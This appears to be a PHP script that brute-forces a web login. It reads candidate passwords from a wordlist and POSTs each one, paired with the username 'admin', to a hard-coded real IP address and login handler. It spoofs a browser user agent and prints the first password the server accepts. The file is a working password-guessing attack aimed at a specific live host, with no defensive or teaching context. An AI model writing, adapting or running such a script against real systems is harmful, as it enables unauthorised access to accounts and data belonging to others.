<?php
	$file_path = "wordlist.txt";

	if (file_exists($file_path)) {
		$file_arr = file($file_path);

		foreach($file_arr as $value){
			$res = curl($value);
			if ($res['result']) {
				echo $value . "\r\n";
				break;
			} else {
				echo $res['msg'] . "\r\n";
			}
		}
	}


	function curl($password) 
	{
		$curl = curl_init();
		curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)');
	    curl_setopt($curl, CURLOPT_URL, 'http://210.28.160.155:8081/Ashx/SysLogin.ashx');
	    curl_setopt($curl, CURLOPT_HEADER, 1);
	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	    // curl_setopt($curl, CURLOPT_COOKIE, "JSESSIONID=780C7B70E4783A3797FF5F5E25602AAA");
	    curl_setopt($curl, CURLOPT_POST, 1);
	    $post_data = array(
	        // "userKey" => "D1B5CC2FE46C4CC983C073BCA897935608D926CD32992B5900",
	        "userName" => "admin",
	        "password" => $password,
	        // "randCode" => "v0p1"
	    );
	    curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
	    $data = curl_exec($curl);
	    curl_close($curl);
	    $body = explode("{", $data);
	    $isSuccess = json_decode('{' . $body[1])->{'success'};
	    $msg = json_decode('{' . $body[1])->{'message'};

	    return array(
	    	"result" => $isSuccess,
	    	"msg" => $msg
	    );
	}
